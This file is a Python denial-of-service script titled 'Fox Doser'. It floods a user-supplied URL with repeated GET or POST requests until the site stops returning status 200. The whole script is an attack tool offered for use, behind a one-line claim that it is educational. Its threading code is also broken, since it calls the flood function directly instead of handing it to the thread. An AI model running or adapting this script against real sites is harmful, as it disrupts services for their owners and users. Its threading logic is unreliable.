import requests , time , colorama
import threading
import sys
rd = colorama.Fore.RED
cv = colorama.Fore.WHITE
bl = colorama.Fore.BLUE
mag = colorama.Fore.MAGENTA
gn = colorama.Fore.GREEN
yl = colorama.Fore.YELLOW
cy = colorama.Fore.CYAN


def banner():
    banner = bl + """
|=============================|
|           B F S T           |
|    Black Fox Security Team  |
|   Author : Maximum Radikali |
|     @BlackFoxSecurityTeam   |
|           /\    /\          |
|          Fox   Doser        |
|=============================| 
 
    """
    return banner

def layer_get(host):
    i = 0
    while True:
        code = requests.get(host)
        if code.status_code != 200:
            print (rd + "TimeOut ! Maybe Down" + cv)
            break
        else:
            print (gn + "Packet %s sent to the %s" % (str(i) , host) )
            i += 1
            continue

def layer_post(host):
    i = 0
    while True:
        code = requests.post(host)
        if code.status_code != 200:
            print (rd + "TimeOut ! Maybe Down" + cv)
            break
        else:
            print (gn + "Packet %s sent to the %s" % (str(i) , host) )
            i += 1
            continue

print (banner())
print (rd + "This script only Use for educationally purpose !")
host = input(mag + "[$] Enter URL starts with (https://) - > ")
method = input(cy + "[$] GET \n[$] POST\n\n Enter The Method ex (POST)\n - >  ")
thread = input(mag + "[&] Enter Thread ex : (30) - > ")
aclor = input (bl + "Do you want to Continue ? \n\n[$] URL : %s\n[$] Method : %s\n[$] Thread : %s\n\n [Y , N] -> " % (host , method , thread))

if aclor == "Y":
    if method == "GET":
        for i in range(int(thread)):
            threading.Thread(target=layer_get(host)).start()
    elif method == "POST":
        for i in range(int(thread)):
            threading.Thread(target=layer_post(host)).start()
    else:
        print (yl + "Wrong Type , Please Type Correctly ! ")
        sys.exit()
elif aclor == "N":
    print (yl + "The Operation has been cancelled ! " + cv)
    sys.exit()
else:
    print(rd + "Please Type Correctly ! ")
    sys.exit()

